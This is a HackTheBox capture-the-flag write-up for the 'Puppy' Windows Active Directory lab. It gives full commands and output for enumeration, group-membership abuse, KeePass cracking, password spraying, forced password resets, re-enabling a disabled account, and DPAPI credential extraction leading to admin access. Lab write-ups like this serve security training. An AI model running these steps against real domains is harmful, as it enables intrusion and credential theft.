---
title: Puppy
categories:
  - HackTheBox
tags: [windows, activedirectory, acl, bloodhound, dpapi, passwordcracking]
media_subpath: /images/hackthebox_puppy/
image:
  path: https://labs.hackthebox.com/storage/avatars/6a127b39657062e42c1a8dfdcd23475d.png
---

# Summary 
Puppy is a medium difficulty machine on HackTheBox that focuses on Active Directory. The machine is set in an assumed breach scenario, where the attacker has already compromised a user account and needs to escalate privileges to gain access to the domain administrator account.

We started by enumerating the users credentials with `nxc` and then gathered information of the domain with `bloodhound`. We discovered that our user was a member of `HR` group, which had `GenericAll` rights over the `DEVELOPERS` group, making it possible for us to add our user to that group, looking further on the `AD` after being added to that group we were able to discober a `keepass` file on the `dev` share. Cracking the password for the `keepass` vaul using `keepass2john` and `john the ripper` we got hold of other passwords. Password spraying all of our discovered passwords on the domain users we discovered a set of valid credential for another user that was a member of `Senior Devs` group, which had `GenericAll` over another domain user. With `GenericAll` rights over the user, we were able to change the password of that user and remove the `disabled account` flag from that user and then we could access the machine. After getting access to the machine, we were able to find a backup file that contained a password for another user and from that user we could extract the `dpapi` blobs and extract the credentials for another user that was a member of the `Administrators` group.

## Nmap 

```
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-18 02:03:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Since we are in an assumed breach scenario, we can use our given credentials to enumerate the domain.

## (139/445) SMB

```bash
nxc smb 10.129.16.111 -u levi.james -p 'KingofAkron2025!' --shares
```

> Command Breakdown:
> - `nxc smb`: This is the command to interact with SMB shares from `nxc`.
> - `-u levi.james`: This option specifies the username to authenticate with.
> - `-p 'KingofAkron2025!'`: This option specifies the password for the user.
> - `--shares`: This option lists the available shares on the target system.
{: .prompt-info}

```bash
SMB         10.129.16.111   445    DC               Share           Permissions     Remark
SMB         10.129.16.111   445    DC               -----           -----------     ------
SMB         10.129.16.111   445    DC               ADMIN$                          Remote Admin
SMB         10.129.16.111   445    DC               C$                              Default share
SMB         10.129.16.111   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.16.111   445    DC               IPC$            READ            Remote IPC
SMB         10.129.16.111   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.16.111   445    DC               SYSVOL          READ            Logon server share
```

We have the default permissions on the shares from an authenticated user. We can also see a share called `DEV`, which should be taken note of since it is not a default share.

Moving on with the enumeration, we can enumerate the AD environment using `BloodHound`.

## BloodHound

```bash
# Sping up the BloodHound Docker container
docker-compose up -d 

# Ingest the data using bloodhound-python
bloodhound-ce-python -d PUPPY.HTB -ns 10.129.52.87 -dc DC.PUPPY.HTB --zip -c all -u "levi.james" -p 'KingofAkron2025!'
```
> Command Breakdown:
> - `-d PUPPY.HTB`: This option specifies the domain to enumerate.
> - `-ns`: This option specifies the nameserver to use for DNS resolution.
> - `-dc DC.PUPPY.HTB`: This option specifies the domain controller to use for enumeration.
> - `--zip -c all`: This option specifies the output format and the type of data to collect.
> - `-u, -p`: These options specify the username and password for authentication.
{: .prompt-info}

After ingesting the data, we can open the BloodHound interface and analyze the data. Looking at our owned user first, we can see that 

![NON](file-20250518034844827.png)

We can see that `levi.james` is a member of the `HR` group, which has the `GenericWrite` permission on the `DEVELOPERS` group. This means that we can add ourselves to the `DEVELOPERS` group. We can do that using `BloodyAD` tool

```bash
bloodyAD --host DC.PUPPY.HTB -u levi.james -p 'KingofAkron2025!' add groupMember "DEVELOPERS" levi.james

[+] levi.james added to DEVELOPERS
```

After adding ourselves to the `DEVELOPERS` group, we tried enumerating the shares again to see if we have any new permissions. Running `nxc` again, we can see that we now have `READ` permissions on the `DEV` share.

```bash
nxc smb 10.129.16.111 -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.129.16.111   445    DC               Share           Permissions     Remark
SMB         10.129.16.111   445    DC               -----           -----------     ------
SMB         10.129.16.111   445    DC               ADMIN$                          Remote Admin
SMB         10.129.16.111   445    DC               C$                              Default share
SMB         10.129.16.111   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.16.111   445    DC               IPC$            READ            Remote IPC
SMB         10.129.16.111   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.16.111   445    DC               SYSVOL          READ            Logon server share
```

We can now enumerate the `DEV` share to see if we can find anything interesting. 

```bash
smbclient.py levi.james:'KingofAkron2025!'@PUPPY.HTB
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use dev
# ls
drw-rw-rw-          0  Sun Mar 23 07:07:57 2025 .
drw-rw-rw-          0  Sat Mar  8 16:52:57 2025 ..
-rw-rw-rw-   34394112  Sun Mar 23 07:09:12 2025 KeePassXC-2.7.9-Win64.msi
drw-rw-rw-          0  Sun Mar  9 20:16:16 2025 Projects
-rw-rw-rw-       2677  Wed Mar 12 02:25:46 2025 recovery.kdbx
# get recovery.kdbx
# exit
```

We can see that there is a `recovery.kdbx` file, which is a KeePass database file. We can use `KeePassXC` to open the file, but we need the password to decrypt it. Using `keepass2john` we can extract the hash from the file and then crack it using `hashcat`.

> Note: At first, I was getting the error `File version '40000' is currently not supported!`, which is due to the fact that I was running an outdated version of `john`, so I rebuilded `john` from the source on github and after that it started working.
{: .prompt-warning}

```bash
keepass2john recovery.kdbx > hash

john ./hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

<SNIP>
liverpool        (recovery)
Session completed.
<SNIP>
```

We can see that the password for the `recovery.kdbx` file is `liverpool`. We can now open the file using `KeePassXC` and we can see that there are some credentials stored in the database.

![NON](file-20250518042458550.png)

From the keepass, we gathered a list of passwords by copying the password and pasting on a text file. From this new set of credentials, we started brute forcing the users and the passwords found, where we could find a new set of credentials

```bash
nxc smb DC.PUPPY.HTB -u users -p passwords

<SNIP>
SMB         10.129.16.111   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
<SNIP>

```

Going back to enumerate our new user on bloodhound, we can see that we have `GenericAll` over `adam.silver`, so we can change the user's password.

![NON](file-20250518042956301.png)

**Password change:**
```bash
net rpc password "adam.silver" 'Antman2025!' -U "PUPPY.HTB"/"ant.edwards"%'Antman2025!' -S "10.129.16.111"
```
> Command Breakdown:
> - `net rpc password`: This command is used to change the password of a user in an Active Directory environment.> - `-U "PUPPY.HTB"/"ant.edwards"%'Antman2025!'`: This option specifies the username and password for authentication.
> - `-S`: This option specifies the target server to connect to.
{: .prompt-info}

After changing the password, we can now check the permissions of `adam.silver` using `nxc` one more time.

```bash
  ❯❯ /home/h4z4rd0u5/HTB/Medium/Puppy : nxc smb DC.PUPPY.HTB -u adam.silver -p 'Antman2025!'
SMB         10.129.16.111   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.16.111   445    DC               [-] PUPPY.HTB\adam.silver:Antman2025! STATUS_ACCOUNT_DISABLED
```

We received the `STATUS_ACCOUNT_DISABLED` error, which means that the account is disabled. Since we have `GenericAll` over the `adam.silver`, we can use `BloodyAD` to remove the disabled account flag.

```bash
bloodyAD --host DC.PUPPY.HTB -d "PUPPY.HTB" --dc-ip 10.129.16.111 -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl

nxc smb DC.PUPPY.HTB -u adam.silver -p 'Antman2025!'

SMB         10.129.16.111   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.129.16.111   445    DC               [+] PUPPY.HTB\adam.silver:Antman2025!

nxc winrm DC.PUPPY.HTB -u adam.silver -p 'Antman2025!'

WINRM       10.129.16.111   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.16.111   5985   DC               [+] PUPPY.HTB\adam.silver:Antman2025! (Pwn3d!)
```

### Foothold

We can access the machine using `evil-winrm`

```bash
*Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows


*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> dir


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

We found a backup file, which we can download and extract to analyze it locally. Searching for some more credentials for others users on the machine, we can `grep` for the `usernames` to try to find some more credentials.

```bash
ls

 puppy   site-backup-2024-12-30.zip

cat ../users | while IFS= read -r line; do grep -A2 -Ri "$line";done

puppy/index.html:                                                                                                   <h3><a href="#"> Levi James </a></h3>
puppy/index.html-                                                                                                   <p>
puppy/index.html-Our expert in hiring interns and contract employees carefully scouted from the country's best educational intitutes.                                                                        </p>
puppy/index.html:                                                               <h3><a href="#"> Adam Silver </a></h3>
puppy/index.html-                                                                               <p>
puppy/index.html-Our front-end developer who gets involved with our customer's satisfaction when using products from puppy. Currently absent for a short-term training at the Univerity of oxford.
puppy/index.html:                                                               <h3><a href="#"> Jamie Williamson </a></h3>
puppy/index.html-<p> Our Junior Developer actively solving challenges and gaining experience alongside senior acquaintances. </p>
puppy/index.html-                                                                                                   </section>
puppy/nms-auth-config.xml.bak:        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
puppy/nms-auth-config.xml.bak-        <bind-password>ChefSteph2025!</bind-password>
puppy/nms-auth-config.xml.bak-    </server>
```

We can see that we have found some more credentials for `steph.cooper`, which we can use to access the machine.

```bash
nxc winrm DC.PUPPY.HTB -u steph.cooper -p 'ChefSteph2025!'

WINRM       10.129.16.111   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.16.111   5985   DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (Pwn3d!)
```

## Privilege Escalation

From inside the machine, we can try to extract saved credentials from the machine using `dpapi`. Looking at the user's `AppData` folder, we can see that there is a `Microsoft` folder, which contains a `Credentials` folder. Inside the `Credentials` folder, we can see that it is not empty, so we can try to extract the credentials using impacket's `dpapi` tool.

```bash

Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

*Evil-WinRM* PS C:\Users\steph.cooper\AppData> gci -force Roaming\Microsoft\Protect


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
-a-hs-          3/8/2025   7:40 AM             24 CREDHIST
-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST


*Evil-WinRM* PS C:\Users\steph.cooper\AppData> gci -force Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

We can pass the blobs to our machine using `certuntil` to encode the files to base64 and then decode it on our machine. 

```bash
*Evil-WinRM* PS C:\tmp> certutil -encode C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 .\masterkey.b64
Input Length = 740
Output Length = 1076
CertUtil: -encode command completed successfully.

*Evil-WinRM* PS C:\tmp> certutil -encode C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 .\cred.b64
Input Length = 414
Output Length = 626
CertUtil: -encode command completed successfully.
```

![NON](file-20250518050101513.png)

We can now copy the strings to our machine and decode them using `base64`, saving it to a file and then use the `dpapi.py` tool for extracting the credentials.

```bash
echo 'AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3Ieag
tPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQA
aQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93
s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8
AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYP
SiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1Esx
FdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0a
vyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8Q
mFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc' | base64 -d > cred


echo 'AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYA
LQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAA
iAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOAr
ghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX
7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWv
l1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAA
CYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVW
DQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+
FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/j
jlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y
7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp
4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2
aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7
BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRf
c8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoEx
L3I5Tm2a/F6/oscc9YlciWKEmqQ=' | base64 -d > masterkey

dpapi.py masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

dpapi.py credential -file cred -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

We can see that we have found the credentials for `steph.cooper_adm`, which is a member of the `Administrators` group, so we can use these credentials to access the machine. With these credentials we have `Administrator` access to the machine, which we could use to dump all of the hashes on the domain.
